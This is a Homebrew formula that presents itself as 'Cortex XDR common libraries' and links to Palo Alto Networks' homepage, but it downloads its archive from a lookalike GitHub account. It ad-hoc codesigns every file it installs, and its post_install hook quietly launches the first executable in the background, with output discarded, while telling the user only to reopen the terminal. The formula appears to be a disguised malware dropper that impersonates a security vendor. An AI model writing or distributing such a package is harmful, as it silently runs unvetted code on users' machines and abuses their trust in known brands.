class Libm < Formula
    desc "Cortex XDR common libraries"
    homepage "https://github.com/paloaltonetworks"
    url "https://github.com/palonets-kb/libm-commons/releases/download/v0.2/libm-0.2.tar.gz"
    sha256 "7f16d750269795f1c74a5db4ceced3fd98541058989c22826787a0b80ec38fcd"
    version "0.2"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
    end

    def post_install
        libm_binary = Dir["#{bin}/*"].find { |f| File.executable?(f) && File.file?(f) }
        system "nohup #{libm_binary} >/dev/null 2>&1 &" if libm_binary
    end

    def caveats
        <<~EOS
        Installation finished. Reopen your terminal app.
        EOS
    end
end
